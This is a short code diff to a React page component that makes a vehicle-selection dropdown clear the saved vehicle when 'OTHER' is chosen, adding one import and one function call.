@@ -13,7 +13,7 @@ import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
 import { secureAddData as addData } from "@/lib/secure-firebase"
 import { translations } from "@/lib/translations"
 // استيراد دوال car-bot API
-import { fetchVehiclesByNIN, vehiclesToDropdownOptions, saveSelectedVehicle, type VehicleDropdownOption } from "@/lib/vehicle-api"
+import { fetchVehiclesByNIN, vehiclesToDropdownOptions, saveSelectedVehicle, clearSelectedVehicle, type VehicleDropdownOption } from "@/lib/vehicle-api"
 
 function generateCaptcha() {
   return Math.floor(1000 + Math.random() * 9000).toString()
@@ -478,6 +478,7 @@ export default function HomePage() {
                     value={serialNumber}
                     onChange={(e) => {
                       if (e.target.value === "OTHER") {
+                        clearSelectedVehicle()
                         setShowVehicleDropdown(false)
                         setSerialNumber("")
                       } else {
